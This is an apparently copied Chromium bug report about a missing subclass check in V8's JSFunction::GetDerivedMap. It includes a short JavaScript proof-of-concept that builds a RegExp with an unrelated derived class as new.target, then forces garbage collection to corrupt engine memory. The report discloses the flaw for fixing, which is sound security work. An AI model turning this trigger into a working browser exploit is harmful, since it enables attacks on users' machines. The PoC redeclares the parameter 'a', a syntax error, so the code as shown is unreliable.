From https://bugs.chromium.org/p/chromium/issues/detail?id=800032

There's a comment saying "Fast case, new.target is a subclass of constructor." in the JSFunction::GetDerivedMap method, but it doesn't check that "new_target" is actually a subclass of "constructor". So if "new_target" is not a subclass of "constructor", "pre_allocated" can be higher than "in_object_properties". To exploit this, it required to be able to change the value of "constructor_initial_map->UnusedPropertyFields()", but I couldn't find any way. So I'm not so sure about this part.

PoC:
function gc() {
    for (let i = 0; i < 20; i++)
        new ArrayBuffer(0x2000000);
}


class Derived extends Array {
    constructor(a) {
        const a = 1;
    }
}

// Derived is not a subclass of RegExp
let o = Reflect.construct(RegExp, [], Derived);
o.lastIndex = 0x1234;

gc();
